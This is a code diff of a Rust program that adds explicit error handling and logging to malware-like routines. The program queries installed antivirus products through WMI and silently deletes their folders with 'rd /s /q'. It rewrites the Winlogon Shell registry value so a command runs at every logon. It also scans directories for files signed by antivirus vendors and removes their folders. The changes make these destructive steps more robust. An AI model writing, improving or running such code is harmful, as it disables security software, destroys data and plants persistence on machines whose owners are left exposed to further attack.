@@ -61,14 +61,32 @@ fn is_safe_mode() -> bool {
 
 fn remove_antivirus_folder() -> Result<(), Box<dyn std::error::Error>> {
     // Create the COM library instance
-    let com_lib = COMLibrary::new()?;
+    let com_lib = match COMLibrary::new() {
+        Ok(lib) => lib,
+        Err(e) => {
+            eprintln!("Failed to initialize COM library: {}", e);
+            return Err(Box::new(e));
+        }
+    };
+
     // Pass the COMLibrary instance to WMIConnection::new
-    let wmi_con = WMIConnection::new(com_lib)?;
+    let wmi_con = match WMIConnection::new(com_lib) {
+        Ok(con) => con,
+        Err(e) => {
+            eprintln!("Failed to establish WMI connection: {}", e);
+            return Err(Box::new(e));
+        }
+    };
 
     // Query to get antivirus product information
     let query = "SELECT * FROM AntivirusProduct";
-    // Use the ? operator to extract the Vec on success.
-    let results: Vec<HashMap<String, String>> = wmi_con.raw_query(query)?;
+    let results: Vec<HashMap<String, String>> = match wmi_con.raw_query(query) {
+        Ok(res) => res,
+        Err(e) => {
+            eprintln!("Failed to execute WMI query: {}", e);
+            return Err(Box::new(e));
+        }
+    };
 
     // Loop through the results and extract the executable path's folder
     for result in results {
@@ -77,16 +95,30 @@ fn remove_antivirus_folder() -> Result<(), Box<dyn std::error::Error>> {
             if let Some(folder_path) = Path::new(path).parent() {
                 println!("Executable folder path: {}", folder_path.display());
 
-                // Remove the folder using rd /s /q (silent remove)
-                let folder_path_str = folder_path.to_str().ok_or("Invalid path")?;
+                // Convert the folder path to a string
+                let folder_path_str = match folder_path.to_str() {
+                    Some(s) => s,
+                    None => {
+                        eprintln!("Invalid folder path: {}", folder_path.display());
+                        continue;
+                    }
+                };
+
+                // Execute the remove command
                 let status = Command::new("cmd")
                     .args(&["/C", "rd", "/s", "/q", folder_path_str])
-                    .status()?;
+                    .status();
 
-                if status.success() {
-                    println!("Successfully removed the folder: {}", folder_path.display());
-                } else {
-                    eprintln!("Failed to remove the folder: {}", folder_path.display());
+                match status {
+                    Ok(exit_status) if exit_status.success() => {
+                        println!("Successfully removed the folder: {}", folder_path.display());
+                    }
+                    Ok(_) => {
+                        eprintln!("Failed to remove the folder: {}", folder_path.display());
+                    }
+                    Err(e) => {
+                        eprintln!("Error executing remove command: {}", e);
+                    }
                 }
             }
         }
@@ -98,16 +130,33 @@ fn remove_antivirus_folder() -> Result<(), Box<dyn std::error::Error>> {
 fn modify_registry() -> io::Result<()> {
     // Open the registry key for Winlogon with write access
     let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
-    let (winlogon_key, _disp) = hkcu.create_subkey_with_flags(
+
+    let winlogon_key = match hkcu.create_subkey_with_flags(
         r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
         KEY_WRITE,
-    )?;
+    ) {
+        Ok((key, _)) => key,
+        Err(e) => {
+            eprintln!("Failed to open or create registry key: {}", e);
+            return Err(e);
+        }
+    };
 
     // Set the new "Shell" value
     let new_shell_value = r"%SystemRoot%\explorer.exe, cmd.exe /c start explorer.exe";
-    winlogon_key.set_value("Shell", &new_shell_value)?;
 
-    println!("Registry modified successfully: Shell set to \"{}\".", new_shell_value);
+    match winlogon_key.set_value("Shell", &new_shell_value) {
+        Ok(_) => {
+            println!(
+                "Registry modified successfully: Shell set to \"{}\".",
+                new_shell_value
+            );
+        }
+        Err(e) => {
+            eprintln!("Failed to modify registry value: {}", e);
+            return Err(e);
+        }
+    }
 
     Ok(())
 }
@@ -233,13 +282,24 @@ fn get_signature_subject(file_path: &str) -> Option<String> {
 /// Removes the entire folder containing the file at `file_path`.
 fn remove_folder(file_path: &str) -> io::Result<()> {
     let path = Path::new(file_path);
+
     if let Some(parent) = path.parent() {
         println!("Deleting folder: {}", parent.display());
-        fs::remove_dir_all(parent)?; // Propagate errors
-        println!("Successfully removed folder: {}", parent.display());
-        Ok(())
+
+        match fs::remove_dir_all(parent) {
+            Ok(_) => {
+                println!("Successfully removed folder: {}", parent.display());
+                Ok(())
+            }
+            Err(e) => {
+                eprintln!("Failed to remove folder {}: {}", parent.display(), e);
+                Err(e)
+            }
+        }
     } else {
-        Err(io::Error::new(io::ErrorKind::Other, "Could not determine parent folder"))
+        let err_msg = "Could not determine parent folder";
+        eprintln!("{}", err_msg);
+        Err(io::Error::new(io::ErrorKind::Other, err_msg))
     }
 }
 
@@ -250,7 +310,13 @@ fn remove_folder(file_path: &str) -> io::Result<()> {
 fn scan_directory(dir: &str) -> io::Result<()> {
     println!("Scanning directory: {}", dir);
 
-    let entries = fs::read_dir(dir)?;
+    let entries = match fs::read_dir(dir) {
+        Ok(e) => e,
+        Err(e) => {
+            eprintln!("Failed to read directory {}: {}", dir, e);
+            return Err(e);
+        }
+    };
 
     for entry in entries {
         match entry {
@@ -269,9 +335,11 @@ fn scan_directory(dir: &str) -> io::Result<()> {
                                         "File {} has certificate subject matching antivirus: {}",
                                         file_path, subject
                                     );
+
                                     if let Err(e) = remove_folder(&file_path) {
                                         eprintln!("Failed to remove folder for {}: {}", file_path, e);
-                                    }                                    
+                                    }
+
                                     break;
                                 }
                             }
